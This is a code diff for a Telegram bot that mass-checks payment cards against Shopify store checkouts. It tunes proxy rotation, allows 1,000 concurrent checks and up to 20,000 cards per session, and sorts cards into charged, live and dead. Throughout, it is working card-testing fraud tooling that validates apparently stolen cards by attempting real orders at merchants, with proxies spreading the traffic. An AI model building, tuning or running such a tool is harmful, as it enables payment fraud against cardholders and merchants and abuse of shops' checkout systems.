@@ -71,9 +71,16 @@ OUTER_RETRY_DELAYS = [
     int(os.environ.get("RETRY_DELAY_3", 180)),
 ]
 
-# ═══ PER-CARD RETRY BUDGETS ═══
-MAX_PROXY_RETRIES = 30   # proxy/connection failures before giving up
-MAX_SITE_RETRIES  = 15   # site-level failures before giving up
+# ═══ PER-CARD RETRY BUDGETS (v10K tuning) ═══
+MAX_PROXY_RETRIES = 2    # one proxy rotation, then give up
+MAX_SITE_RETRIES  = 2    # one site rotation, then give up
+
+# ═══ CONCURRENCY + TIMEOUTS (v10K tuning) ═══
+CARD_CONCURRENCY = 1000   # parallel card slots
+CARD_HARD_TIMEOUT = 30.0  # absolute cap per card (wait_for)
+API_TIMEOUT = 12.0        # per msh -> api HTTP call
+API_MAX_RETRIES = 1       # single replica try; msh retries on failure
+API_ATTEMPTS = 3          # max sites per api.py call
 
 # ═══ STRUCTURED CODE CLASSIFICATIONS ═══
 SKIP_SITE_CODES = {
@@ -89,6 +96,7 @@ SITE_ERROR_CODES = {
     "SUBMIT_FAILED", "TOKENIZATION_FAILED", "ORDER_CREATION_FAILED",
     "NO_PAYMENT_REQUIRED",
 }
+POOL_EXHAUSTED_CODES = {"SITES_EXHAUSTED", "Pool Exhausted"}
 CHARGED_CODES = {"ORDER_PLACED"}
 APPROVED_CODES = {
     "INSUFFICIENT_FUNDS", "INVALID_CVC", "INCORRECT_CVC",
@@ -117,7 +125,13 @@ def _get_msh_http_session():
     if _MSH_HTTP_SESSION is None or _MSH_HTTP_SESSION.closed:
         _MSH_HTTP_SESSION = aiohttp.ClientSession(
             timeout=aiohttp.ClientTimeout(total=60),
-            connector=aiohttp.TCPConnector(limit=1000, ssl=False)
+            connector=aiohttp.TCPConnector(
+                limit=2000,
+                limit_per_host=2000,
+                ttl_dns_cache=300,
+                ssl=False,
+            ),
+            auto_decompress=False,
         )
     return _MSH_HTTP_SESSION
 
@@ -512,6 +526,7 @@ FINAL_GOOD_RESPONSES = frozenset({
 FINAL_SITE_REJECTIONS = frozenset({
     "NO_PRODUCT", "PRICE_TOO_HIGH", "NO_PRODUCT_FOUND",
     "NO_SHOPIFY_PAYMENTS_GATEWAY", "SITE_REQUIRES_LOGIN",
+    "SITES_EXHAUSTED",
 })
 RETRYABLE_ERRORS = frozenset({
     "THROTTLED", "TIMEOUT", "PROXY_ERROR", "SITE_ERROR",
@@ -540,7 +555,6 @@ def _classify_for_retry(response_msg: str) -> str:
 
 
 def _extract_code(message: str) -> str:
-    """Extract the leading structured code from a response message."""
     if not message:
         return ""
     return message.upper().split(" - ")[0].split(":")[0].strip()
@@ -711,7 +725,7 @@ def get_user_display(user_obj, plan_name):
 
 
 # ═══════════════════════════════════════════════════════════════
-# API CALL — delegates to shopify_api.check_shopify_card
+# API CALL
 # ═══════════════════════════════════════════════════════════════
 
 async def process_card_api(
@@ -728,14 +742,17 @@ async def process_card_api(
         _http = _get_msh_http_session()
         data = await check_shopify_card(
             site=site, cc=cc_formatted, proxy=api_proxy or None,
-            session=_http, max_retries=3, timeout_sec=40.0,
-            fallback_sites=fallback_sites, attempts=15, auto=False,
+            session=_http,
+            max_retries=API_MAX_RETRIES,
+            timeout_sec=API_TIMEOUT,
+            fallback_sites=fallback_sites,
+            attempts=API_ATTEMPTS,
+            auto=False,
         )
         api_response = data.get("Response") or data.get("Message") or "Unknown Error"
         if api_response is None: api_response = "Unknown Error"
         if not isinstance(api_response, str): api_response = str(api_response)
 
-        # Append decline reason if structured code came through bare
         msg_field = data.get("Message") or data.get("message")
         code_field = data.get("decline_code") or data.get("code")
         api_lower = api_response.lower()
@@ -766,7 +783,7 @@ async def process_card_api(
 
 
 # ═══════════════════════════════════════════════════════════════
-# RESULT FILE  (All report now shows summary + errors prominently)
+# RESULT FILE (All report shows breakdown + deferred)
 # ═══════════════════════════════════════════════════════════════
 
 def generate_result_file(session: dict, result_type: str, user_obj, plan_name: str) -> Tuple[BytesIO, str, int]:
@@ -801,7 +818,6 @@ def generate_result_file(session: dict, result_type: str, user_obj, plan_name: s
     lines.append(f"🌐 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➛ 𝗦𝗵𝗼𝗽𝗶𝗙𝘆 𝗠𝗮𝘀𝘀")
     lines.append(f"𝗣𝗼𝘄𝗲𝗿𝗲𝗱 𝗕𝘆 ➛ Starkz")
 
-    # ─── Summary shown ONLY on the All report ───
     if result_type == "all":
         lines.append("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
         lines.append("📊 𝗕𝗿𝗲𝗮𝗸𝗱𝗼𝘄𝗻")
@@ -809,6 +825,9 @@ def generate_result_file(session: dict, result_type: str, user_obj, plan_name: s
         lines.append(f"   ✅ Live    : {len(live_list)}")
         lines.append(f"   ❌ Dead    : {len(dead_list)}")
         lines.append(f"   ⚠️ Errors  : {len(error_list)}")
+        deferred_count = len(session.get('_deferred_cards', []))
+        if deferred_count:
+            lines.append(f"   ⏸️ Deferred: {deferred_count} (sites unavailable / timeout)")
 
     lines.append("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
     lines.append("")
@@ -1048,6 +1067,7 @@ async def update_progress_message(bot: Bot, session_id):
         f"<b><tg-emoji emoji-id='5436113877181941026'>🔥</tg-emoji> 𝗖𝗵𝗮𝗿𝗴𝗲𝗱 ➛</b> <b>{session['charged']}</b>\n"
         f"<b><tg-emoji emoji-id='6237864166879663987'>❌</tg-emoji> 𝗗𝗲𝗮𝗱 ➛</b> <b>{session['dead']}</b>\n"
         f"<b><tg-emoji emoji-id='4915853119839011973'>⚠️</tg-emoji> 𝗘𝗿𝗿𝗼𝗿𝘀 ➛</b> <b>{session['errors']}</b>\n"
+        f"<b>⏸️ Deferred ➛</b> <b>{session.get('deferred', 0)}</b>\n"
         f"<b><tg-emoji emoji-id='5456140674028019486'>⚡</tg-emoji> 𝗧𝗶𝗺𝗲 ➛</b> <b>{elapsed_str}</b>\n"
         f"<b><tg-emoji emoji-id='5039653765439816618'>🐈‍⬛</tg-emoji> 𝗗𝗲𝘃 ➛</b> <a href='https://t.me/oozaruh'>Starkz</a>\n"
         f"<b><tg-emoji emoji-id='5406683434124859552'>🆔</tg-emoji> 𝗦𝗲𝘀𝘀𝗶𝗼𝗻 𝗜𝗗 ➛</b> <code>{session_id}</code>"
@@ -1073,6 +1093,38 @@ async def update_progress_message(bot: Bot, session_id):
                 logging.error(f"Error updating progress: {e}")
         except Exception as e:
             logging.error(f"Error updating progress: {e}")
+
+
+async def _background_progress_updater(bot: Bot, session_id: str):
+    """
+    Single background task that refreshes the progress message every ~3.5s.
+    Replaces per-card calls to update_progress_message, which caused 1000-way
+    lock contention at high concurrency.
+    """
+    while True:
+        session = MSH_SESSIONS.get(session_id)
+        if not session:
+            return
+
+        if session['status'] in ("FINISHED", "STOPPED"):
+            session['last_update_time'] = 0
+            try:
+                await update_progress_message(bot, session_id)
+            except Exception:
+                pass
+            return
+
+        await asyncio.sleep(3.5)
+
+        # Skip while the retry banner is active (current_round > 0)
+        if session.get('current_round', 0) > 0:
+            continue
+
+        session['last_update_time'] = 0
+        try:
+            await update_progress_message(bot, session_id)
+        except Exception as e:
+            logging.debug(f"[MSH] background updater error: {e}")
 
 
 async def _update_retry_banner(bot: Bot, session_id, round_num, retry_total, delay, phase="waiting"):
@@ -1103,7 +1155,7 @@ async def _update_retry_banner(bot: Bot, session_id, round_num, retry_total, del
 
 
 # ═══════════════════════════════════════════════════════════════
-# PER-CARD PROCESSING — single retry loop with 3 separate counters
+# PER-CARD PROCESSING
 # ═══════════════════════════════════════════════════════════════
 
 async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, user_obj, plan_name,
@@ -1120,8 +1172,6 @@ async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, us
             session['retry_checked'] = session.get('retry_checked', 0) + 1
         else:
             session['checked'] += 1
-            if session['checked'] % 3 == 0 or session['checked'] == session['total']:
-                await update_progress_message(bot, session_id)
         return
 
     proxy_manager = session.get('proxy_manager')
@@ -1132,8 +1182,6 @@ async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, us
             session['retry_checked'] = session.get('retry_checked', 0) + 1
         else:
             session['checked'] += 1
-            if session['checked'] % 3 == 0 or session['checked'] == session['total']:
-                await update_progress_message(bot, session_id)
         return
 
     result_status = "ERROR"
@@ -1145,7 +1193,6 @@ async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, us
     used_site = None
     is_insufficient = False
 
-    # ─── Three separate retry counters ───
     proxy_fails      = 0
     site_fails       = 0
     no_product_hits  = 0
@@ -1167,7 +1214,6 @@ async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, us
         if is_session_stopped(session_id):
             return
 
-        # ── Exit conditions ──────────────────────────────────
         if proxy_fails >= MAX_PROXY_RETRIES:
             result_status = "ERROR"
             response_msg = f"All proxies exhausted ({proxy_fails} proxy errors)"
@@ -1177,11 +1223,10 @@ async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, us
             response_msg = f"All sites exhausted ({site_fails} site errors)"
             break
         if no_product_hits >= len(sites_list):
-            result_status = "SKIPPED"
+            result_status = "DEFERRED"
             response_msg = "No sites with products available"
             break
 
-        # ── Get a proxy ──────────────────────────────────────
         proxy_result = proxy_manager.get_next_proxy()
         if not proxy_result or proxy_result[0] is None:
             result_status = "ERROR"
@@ -1193,7 +1238,6 @@ async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, us
         if is_session_stopped(session_id):
             return
 
-        # ── Pick a site that might have products ─────────────
         blacklisted = GLOBAL_BLACKLISTED_SITES | session.get('_blacklisted_sites', set())
         no_products = session.get('_no_product_sites', set())
         available = [s for s in sites_list if s not in blacklisted and s not in no_products]
@@ -1201,18 +1245,17 @@ async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, us
         if not available:
             non_np = [s for s in sites_list if s not in no_products]
             if not non_np:
-                result_status = "SKIPPED"
+                result_status = "DEFERRED"
                 response_msg = "No sites with products available"
                 break
             available = non_np
         site = random.choice(available)
         used_site = site
 
-        # ── Call API ─────────────────────────────────────────
         try:
             success, message, url, gateway, price, currency, proxy_status_raw, http_status = await process_card_api(
                 cc=cc, mes=mm, ano=yy, cvv=cvv, site=site, proxy=proxy,
-                fallback_sites=[s for s in available if s != site],
+                fallback_sites=sites_list,
             )
         except asyncio.CancelledError:
             raise
@@ -1238,44 +1281,45 @@ async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, us
         api_price = price
         proxy_manager.report_result(proxy, message, http_status)
 
-        # ── Classify via structured code ─────────────────────
         code = _extract_code(message)
 
-        # 1. SKIP_SITE — try a different site, do NOT consume any budget
+        if code in POOL_EXHAUSTED_CODES:
+            logging.info(f"[MSH] Sites exhausted for {cc_formatted} — deferring")
+            result_status = "DEFERRED"
+            response_msg = "Sites unavailable"
+            break
+
         if code in SKIP_SITE_CODES:
             session.setdefault('_no_product_sites', set()).add(site)
             no_product_hits += 1
             logging.info(
                 f"[MSH] Site {site} rejected ({code}) for {cc_formatted} — "
-                f"trying another site ({no_product_hits} sites rejected)"
+                f"trying another ({no_product_hits}/{len(sites_list)})"
             )
             await asyncio.sleep(0.05)
             continue
 
-        # 2. PROXY_ERROR — rotate proxy silently
         if code in PROXY_ERROR_CODES:
             proxy_fails += 1
             logging.info(
-                f"[MSH] Proxy/connection error for {cc_formatted} — "
-                f"rotating proxy ({proxy_fails}/{MAX_PROXY_RETRIES}): {message[:80]}"
+                f"[MSH] Proxy error for {cc_formatted} — rotating "
+                f"({proxy_fails}/{MAX_PROXY_RETRIES}): {message[:80]}"
             )
             await asyncio.sleep(0.1)
             continue
 
-        # 3. SITE_ERROR — try a different site
         if code in SITE_ERROR_CODES:
             site_fails += 1
             session.setdefault('_blacklisted_sites', set()).add(site)
             logging.info(
                 f"[MSH] Site error for {cc_formatted} on {site} — "
-                f"trying another site ({site_fails}/{MAX_SITE_RETRIES}): {message[:60]}"
+                f"trying another ({site_fails}/{MAX_SITE_RETRIES}): {message[:60]}"
             )
             await asyncio.sleep(0.05)
             continue
 
-        # 4. CHARGED
         if code in CHARGED_CODES or "ORDER_PLACED" in message.upper():
-            logging.info(f"[MSH] Potential CHARGED on {site} — running fake-card verification")
+            logging.info(f"[MSH] Potential CHARGED on {site} — running fake verification")
 
             FAKE_CARDS = [
                 {"cc": "4003035140199121", "mes": "11", "ano": "2029", "cvv": "470"},
@@ -1329,20 +1373,18 @@ async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, us
                 response_msg = message
                 break
 
-        # 5. APPROVED (insufficient funds / other live)
         if code in APPROVED_CODES:
             result_status = "APPROVED"
             response_msg = message
             is_insufficient = code in INSUFFICIENT_CODES
             break
 
-        # 6. DEAD (card decline)
         if code in DEAD_CODES:
             result_status = "DEAD"
             response_msg = message
             break
 
-        # 7. Unknown → treat as transient (safe fallback, retry with different proxy)
+        # Unknown response — treat as transient (retry with new proxy)
         proxy_fails += 1
         logging.info(f"[MSH] Unknown response for {cc_formatted}: {message[:80]} — retrying")
         await asyncio.sleep(0.1)
@@ -1426,19 +1468,13 @@ async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, us
     elif result_status == "SKIPPED":
         logging.info(f"[MSH] Skipped {cc_formatted} — {response_msg}")
 
-    if is_session_stopped(session_id):
-        return
+    elif result_status == "DEFERRED":
+        session['deferred'] = session.get('deferred', 0) + 1
+        session.setdefault('_deferred_cards', []).append(card_result_data)
+        logging.info(f"[MSH] Deferred {cc_formatted} — {response_msg}")
 
-    if is_retry:
-        rc = session.get('retry_checked', 0)
-        rt = session.get('retry_total', 0)
-        if rc % 3 == 0 or rc == rt:
-            await _update_retry_banner(
-                bot, session_id, session.get('current_round', 1), rt, 0, phase="running"
-            )
-    else:
-        if session['checked'] % 3 == 0 or session['checked'] == session['total']:
-            await update_progress_message(bot, session_id)
+    # NOTE: progress updates are handled by the background updater task.
+    # No per-card await to update_progress_message — avoids 1000-way lock contention.
 
 
 # ═══════════════════════════════════════════════════════════════
@@ -1704,7 +1740,7 @@ async def msh_command(message: types.Message):
         return
     valid_cards = []
     expired_count = invalid_luhn_count = 0
-    MAX_VALID_CARDS = 10000
+    MAX_VALID_CARDS = 20000
     for card_string in extracted:
         if len(valid_cards) >= MAX_VALID_CARDS: break
         pc = card_string.split('|')
@@ -1737,7 +1773,8 @@ async def process_mass_check_background(message: types.Message, bot: Bot, valid_
     plan_name = await get_user_plan_name(user_id)
     proxy_manager = ProxyManager(user_proxies, session_id)
     proxy_stats = proxy_manager.get_stats()
-    logging.info(f"🔄 [MSH] Session {session_id}: {proxy_stats['total_proxies']} proxies")
+    logging.info(f"🔄 [MSH] Session {session_id}: {proxy_stats['total_proxies']} proxies, "
+                 f"{total_cards} cards, concurrency={CARD_CONCURRENCY}")
     initial_text = (
         f"<b><tg-emoji emoji-id='5039895103947146186'>🌐</tg-emoji> 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➛</b> Shopify\n"
         f"<b><tg-emoji emoji-id='5231200819986047254'>📊</tg-emoji> 𝗦𝘁𝗮𝘁𝘂𝘀 ➛</b> <i>CHECKING</i> <tg-emoji emoji-id='5269531045165816230'>🔄</tg-emoji>\n"
@@ -1746,6 +1783,7 @@ async def process_mass_check_background(message: types.Message, bot: Bot, valid_
         f"<b><tg-emoji emoji-id='5436113877181941026'>🔥</tg-emoji> 𝗖𝗵𝗮𝗿𝗴𝗲𝗱 ➛</b> <b>0</b>\n"
         f"<b><tg-emoji emoji-id='6237864166879663987'>❌</tg-emoji> 𝗗𝗲𝗮𝗱 ➛</b> <b>0</b>\n"
         f"<b><tg-emoji emoji-id='4915853119839011973'>⚠️</tg-emoji> 𝗘𝗿𝗿𝗼𝗿𝘀 ➛</b> <b>0</b>\n"
+        f"<b>⏸️ Deferred ➛</b> <b>0</b>\n"
         f"<b><tg-emoji emoji-id='5456140674028019486'>⚡</tg-emoji> 𝗧𝗶𝗺𝗲 ➛</b> <b>0s</b>\n"
         f"<b><tg-emoji emoji-id='5039653765439816618'>🐈‍⬛</tg-emoji> 𝗗𝗲𝘃 ➛</b> <a href='https://t.me/oozaruh'>Starkz</a>\n"
         f"<b><tg-emoji emoji-id='5406683434124859552'>🆔</tg-emoji> 𝗦𝗲𝘀𝘀𝗶𝗼𝗻 𝗜𝗗 ➛</b> <code>{session_id}</code>"
@@ -1757,10 +1795,11 @@ async def process_mass_check_background(message: types.Message, bot: Bot, valid_
         "chat_id": chat_id, "user_id": user_id,
         "msg_id": progress_msg.message_id, "user_msg_id": message.message_id,
         "total": total_cards, "checked": 0, "approved": 0, "charged": 0, "dead": 0,
-        "errors": 0, "start_time": time.time(), "tasks": [],
+        "errors": 0, "deferred": 0, "start_time": time.time(), "tasks": [],
         "proxies": user_proxies, "proxy_manager": proxy_manager, "bad_proxies": [],
         "last_text": "", "last_update_time": 0,
         "live_cards": [], "dead_cards": [], "charged_cards": [], "error_cards": [],
+        "_deferred_cards": [],
         "user_obj": user_obj, "plan_name": plan_name, "is_group": is_group,
         "retry_checked": 0, "retry_total": 0, "current_round": 0,
         "_blacklisted_sites": set(),
@@ -1779,12 +1818,17 @@ async def _run_single_round(bot: Bot, session_id, cards, user_obj, plan_name, ro
     session = MSH_SESSIONS.get(session_id)
     if not session:
         return
+
     is_retry = round_num > 0
     if is_retry:
         session['current_round'] = round_num
         session['retry_total'] = len(cards)
         session['retry_checked'] = 0
-    sem = asyncio.Semaphore(260)
+
+    # Prune finished tasks from previous rounds to keep the list small
+    session['tasks'] = [t for t in session.get('tasks', []) if not t.done()]
+
+    sem = asyncio.Semaphore(CARD_CONCURRENCY)
 
     async def worker(cc_formatted, cc_num):
         if is_session_stopped(session_id):
@@ -1793,11 +1837,31 @@ async def _run_single_round(bot: Bot, session_id, cards, user_obj, plan_name, ro
             if is_session_stopped(session_id):
                 return
             try:
-                await process_single_card(
-                    session_id, cc_formatted, cc_num,
-                    session['user_id'], bot, user_obj, plan_name,
-                    is_retry=is_retry,
+                await asyncio.wait_for(
+                    process_single_card(
+                        session_id, cc_formatted, cc_num,
+                        session['user_id'], bot, user_obj, plan_name,
+                        is_retry=is_retry,
+                    ),
+                    timeout=CARD_HARD_TIMEOUT,
                 )
+            except asyncio.TimeoutError:
+                logging.warning(f"[MSH] Card timed out after {CARD_HARD_TIMEOUT}s: {cc_formatted}")
+                _s = MSH_SESSIONS.get(session_id)
+                if _s:
+                    if is_retry:
+                        _s['retry_checked'] = _s.get('retry_checked', 0) + 1
+                    else:
+                        _s['checked'] += 1
+                        _s['deferred'] = _s.get('deferred', 0) + 1
+                        _s.setdefault('_deferred_cards', []).append({
+                            'card': cc_formatted,
+                            'response': f'Timed out ({CARD_HARD_TIMEOUT:.0f}s cap)',
+                            'bin_info': {}, 'price': '0.00',
+                            'gateway': 'Shopify', 'proxy_used': 'N/A',
+                            'site_used': 'N/A',
+                            'timestamp': datetime.now().isoformat(),
+                        })
             except asyncio.CancelledError:
                 raise
             except Exception as e:
@@ -1809,8 +1873,6 @@ async def _run_single_round(bot: Bot, session_id, cards, user_obj, plan_name, ro
                         _s['retry_checked'] = _s.get('retry_checked', 0) + 1
                     else:
                         _s['checked'] += 1
-                        if _s['checked'] % 3 == 0 or _s['checked'] == _s['total']:
-                            await update_progress_message(bot, session_id)
 
     tasks = []
     for cc_formatted, cc_num in cards:
@@ -1819,7 +1881,7 @@ async def _run_single_round(bot: Bot, session_id, cards, user_obj, plan_name, ro
         task = asyncio.create_task(worker(cc_formatted, cc_num))
         tasks.append(task)
         session['tasks'].append(task)
-    logging.info(f"[MSH] Round {round_num}: {len(tasks)} tasks created")
+    logging.info(f"[MSH] Round {round_num}: {len(tasks)} tasks created (semaphore={CARD_CONCURRENCY})")
     if tasks:
         await asyncio.gather(*tasks, return_exceptions=True)
 
@@ -1828,7 +1890,15 @@ async def run_mass_checker(bot: Bot, session_id, cards, user_obj, plan_name):
     session = MSH_SESSIONS.get(session_id)
     if not session:
         return
+
+    # Start the single progress updater task
+    updater_task = asyncio.create_task(
+        _background_progress_updater(bot, session_id)
+    )
+    session['_updater_task'] = updater_task
+
     await _run_single_round(bot, session_id, cards, user_obj, plan_name, round_num=0)
+
     for round_num in range(1, MAX_OUTER_ROUNDS + 1):
         session = MSH_SESSIONS.get(session_id)
         if not session or is_session_stopped(session_id):
@@ -1853,27 +1923,44 @@ async def run_mass_checker(bot: Bot, session_id, cards, user_obj, plan_name):
         except Exception:
             pass
         delay = 5 if pool_size >= 100 else OUTER_RETRY_DELAYS[min(round_num - 1, len(OUTER_RETRY_DELAYS) - 1)]
-        logging.info(f"[MSH] Round {round_num}: {len(retryable)} retryable, {len(finals)} final rejects, waiting {delay}s")
+        logging.info(f"[MSH] Round {round_num}: {len(retryable)} retryable, {len(finals)} final, waiting {delay}s")
         await _update_retry_banner(bot, session_id, round_num, len(retryable), delay, phase="waiting")
         for _ in range(delay):
             if is_session_stopped(session_id):
                 return
             await asyncio.sleep(1)
+
+        session['_blacklisted_sites'] = set()
+        session['_no_product_sites'] = set()
+
         session['error_cards'] = finals
         session['errors'] = len(finals)
         await _run_single_round(bot, session_id, retryable, user_obj, plan_name, round_num=round_num)
+
     session = MSH_SESSIONS.get(session_id)
     if session:
         residual = len(session.get('error_cards', []))
         if residual:
             logging.info(f"[MSH] Session ended with {residual} unresolved errors")
         session['errors'] = residual
+        session['current_round'] = 0
         if session['status'] != "STOPPED":
             session['status'] = "FINISHED"
-    await update_progress_message(bot, session_id)
+
+    # Let the updater flush the final state before exiting
+    await asyncio.sleep(0.1)
+    updater = session.get('_updater_task') if session else None
+    if updater and not updater.done():
+        try:
+            await asyncio.wait_for(updater, timeout=5.0)
+        except Exception:
+            pass
+
     if session:
         logging.info(
             f"[MSH] Session {session_id} finished — "
             f"charged={session['charged']} approved={session['approved']} "
-            f"dead={session['dead']} errors={session['errors']}"
+            f"dead={session['dead']} errors={session['errors']} "
+            f"deferred={session.get('deferred', 0)} "
+            f"elapsed={time.time() - session['start_time']:.0f}s"
         )
